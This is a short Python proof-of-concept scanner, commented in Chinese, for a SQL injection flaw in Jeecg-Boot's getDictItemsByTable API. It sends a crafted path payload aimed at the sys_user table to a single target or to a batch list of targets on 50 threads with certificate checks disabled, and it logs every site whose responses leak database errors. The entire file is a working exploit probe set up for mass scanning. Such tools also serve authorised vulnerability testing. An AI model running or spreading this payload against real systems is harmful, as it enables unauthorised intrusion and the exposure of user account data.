import argparse,requests
from multiprocessing.dummy import Pool
from urllib3.exceptions import InsecureRequestWarning

# 禁用 SSL 警告
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

def banner():
    print("""""")
    print("[*] Jeecg-Boot getDictItemsByTable SQL注入检测\n")

def poc(target):
    # 构造 payload URL
    payload_url = target.rstrip("/") + "/api/sys/ng-alain/getDictItemsByTable/'%20from%20sys_user/*,%20'/x.js"
    try:
        res = requests.get(payload_url, timeout=10, verify=False)
        # 检测返回是否包含 SQL 错误或异常堆栈
        error_signs = ["sql", "exception", "syntax error", "mysql", "ora-", "postgresql"]
        if any(e.lower() in res.text.lower() for e in error_signs):
            print(f"[+] {target} 存在 SQL注入漏洞")
            with open("result.txt", "a", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            print(f"[-] {target} 未发现 SQL注入")
    except:
        pass

def main():
    banner()
    parser = argparse.ArgumentParser(description="Jeecg-Boot SQL注入检测")
    parser.add_argument("-u", "--url", dest="url", type=str, help="目标 URL")
    parser.add_argument("-f", "--file", dest="file", type=str, help="批量 URL 文件")
    args = parser.parse_args()

    targets = []
    if args.url and not args.file:
        targets.append(args.url.strip())
    elif args.file and not args.url:
        with open(args.file, "r", encoding="utf-8") as f:
            targets = [line.strip() for line in f if line.strip()]
    else:
        print(f"Usage: python {__file__} -u http://target 或 -f url.txt")
        return

    pool = Pool(50)
    for t in targets:
        pool.apply_async(poc, args=(t,))
    pool.close()
    pool.join()

if __name__ == "__main__":
    main()
